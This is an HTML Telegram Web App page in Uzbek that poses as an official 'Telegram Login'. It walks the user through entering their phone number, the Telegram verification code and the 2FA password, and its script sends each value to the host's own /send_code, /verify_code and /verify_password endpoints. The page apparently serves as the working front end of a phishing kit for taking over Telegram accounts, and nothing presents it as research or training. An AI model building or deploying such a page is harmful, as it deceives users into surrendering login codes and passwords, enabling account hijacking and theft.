<!DOCTYPE html>
<html lang="uz">
<head>
<meta charset="UTF-8">
<title>Telegram Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script src="https://telegram.org/js/telegram-web-app.js"></script>

<style>
:root {
  --bg: #0f172a;
  --card: #111827;
  --primary: #2ea6ff;
  --text: #e5e7eb;
  --muted: #9ca3af;
}

* { box-sizing: border-box; }

body {
  margin: 0;
  background: var(--bg);
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  color: var(--text);
}

.wrapper {
  display: flex;
  justify-content: center;
  padding: 20px;
}

.card {
  width: 100%;
  max-width: 360px;
  background: var(--card);
  border-radius: 18px;
  padding: 22px;
  box-shadow: 0 20px 40px rgba(0,0,0,.45);
}

h1 {
  text-align: center;
  font-size: 20px;
  margin: 0 0 6px;
}

.subtitle {
  text-align: center;
  font-size: 13px;
  color: var(--muted);
  margin-bottom: 22px;
}

.step { display: none; }
.step.active { display: block; }

input {
  width: 100%;
  padding: 13px 14px;
  border-radius: 12px;
  border: none;
  background: #020617;
  color: var(--text);
  font-size: 15px;
  outline: none;
  margin-bottom: 14px;
}

input::placeholder { color: #64748b; }

button {
  width: 100%;
  padding: 13px;
  border-radius: 12px;
  border: none;
  background: linear-gradient(135deg, #2ea6ff, #1e90ff);
  color: white;
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
}

button:active { transform: scale(0.98); }

.info {
  margin-top: 10px;
  font-size: 12px;
  color: var(--muted);
  text-align: center;
}
</style>
</head>

<body>
<div class="wrapper">
  <div class="card">

    <h1>üîê Telegram Login</h1>
    <div class="subtitle">
      Profilingizni ulab, tizimga kiring
    </div>

    <!-- 1Ô∏è‚É£ PHONE -->
    <div id="phoneStep" class="step active">
      <input id="phone" placeholder="+998901234567">
      <button id="sendBtn">üì© Kod yuborish</button>
      <div class="info">
        Telegram sizga tasdiqlash kodi yuboradi
      </div>
    </div>

    <!-- 2Ô∏è‚É£ CODE -->
    <div id="codeStep" class="step">
      <input id="code" placeholder="Telegram kodi">
      <button id="verifyBtn">‚úÖ Tasdiqlash</button>
      <div class="info">
        Telegram‚Äôdan kelgan kodni kiriting
      </div>
    </div>

    <!-- 3Ô∏è‚É£ 2FA -->
    <div id="passwordStep" class="step">
      <input id="password" type="password"
             placeholder="Telegram paroli (2FA)">
      <button id="passwordBtn">üîì Tizimga kirish</button>
      <div class="info">
        2 bosqichli himoya yoqilgan
      </div>
    </div>

  </div>
</div>

<script>
const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

const API = "/";   // login_server root

let phoneValue = "";

function show(id) {
  document.querySelectorAll(".step")
    .forEach(s => s.classList.remove("active"));
  document.getElementById(id).classList.add("active");
}

// üì© SEND CODE
async function sendCode() {
  const phone = document.getElementById("phone").value.trim();
  if (!phone) {
    alert("Telefon raqamni kiriting");
    return;
  }

  phoneValue = phone;

  const res = await fetch("/send_code", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      phone: phone
    })
});


  const data = await res.json();

  if (data.status === "code_sent") {
    show("codeStep");
  } else if (data.status === "flood_wait") {
    alert("Biroz kuting: " + data.seconds + " soniya");
  } else {
    alert("Xatolik: " + JSON.stringify(data));
  }
}

// ‚úÖ VERIFY CODE
async function verifyCode() {
  const code = document.getElementById("code").value.trim();
  if (!code) {
    alert("Kodni kiriting");
    return;
  }

  const res = await fetch("/verify_code", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      phone: phoneValue,
      code: code
    })
  });


  const data = await res.json();

  if (data.status === "success") {
    alert("‚úÖ Tizimga muvaffaqiyatli kirdingiz");
    setTimeout(() => tg.close(), 400);
  } else if (data.status === "2fa_required") {
    show("passwordStep");
  } else if (data.status === "invalid_code") {
    alert("Kod noto‚Äòg‚Äòri");
  } else {
    alert("Xatolik: " + JSON.stringify(data));
  }
}

// üîì VERIFY PASSWORD
async function verifyPassword() {
  const password = document.getElementById("password").value.trim();
  if (!password) {
    alert("Parolni kiriting");
    return;
  }

  const res = await fetch("/verify_password", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      phone: phoneValue,
      password: password
    })
  });


  const data = await res.json();

  if (data.status === "success") {
    alert("‚úÖ Tizimga muvaffaqiyatli kirdingiz");
    setTimeout(() => tg.close(), 400);
  } else {
    alert("Parol noto‚Äòg‚Äòri");
  }
}

document.getElementById("sendBtn").onclick = sendCode;
document.getElementById("verifyBtn").onclick = verifyCode;
document.getElementById("passwordBtn").onclick = verifyPassword;
</script>
</body>
</html>
